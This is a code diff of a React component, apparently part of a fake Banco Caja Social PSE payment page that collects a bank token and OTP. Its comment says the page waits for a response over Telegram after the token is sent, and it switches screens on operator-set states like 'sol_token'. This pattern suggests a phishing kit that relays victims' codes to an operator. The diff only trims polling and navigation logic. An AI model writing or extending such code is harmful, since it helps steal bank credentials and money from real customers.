@@ -227,32 +227,11 @@ export default function CajaSocialTokenPse() {
           navigate(ROUTES.otp, { replace: true });
           break;
         case "sol_token":
-          // Se valida si el token fue enviado y el flujo sigue esperando respuesta
+          // Si estamos esperando respuesta de Telegram tras enviar Token, continuar esperando
           if (esperandoRespuestaTrasEnviarRef.current) {
-            if (!tokenTrasEnviarVioPendienteRef.current) {
-              break;
-            }
-
-            // Se resetea el control de reenvio tras ver pendiente
-            tokenTrasEnviarVioPendienteRef.current = false;
-            esperandoRespuestaTrasEnviarRef.current = false;
-
-            // Se desactiva el loading
-            setLoading(false);
-
-            // Se limpia la UI del token
-            setToken("");
-            setTokenError(null);
-            updateStateSession("sol_token");
-            initPolling();
             break;
           }
-
-          // Se mantiene la misma pantalla token sin reenviar navegación
-          stopPolling();
           setLoading(false);
-          updateStateSession("sol_token");
-          navigate(ROUTES.token, { replace: true });
           break;
         case "sol_finalizar":
         case "sol_finalizado":
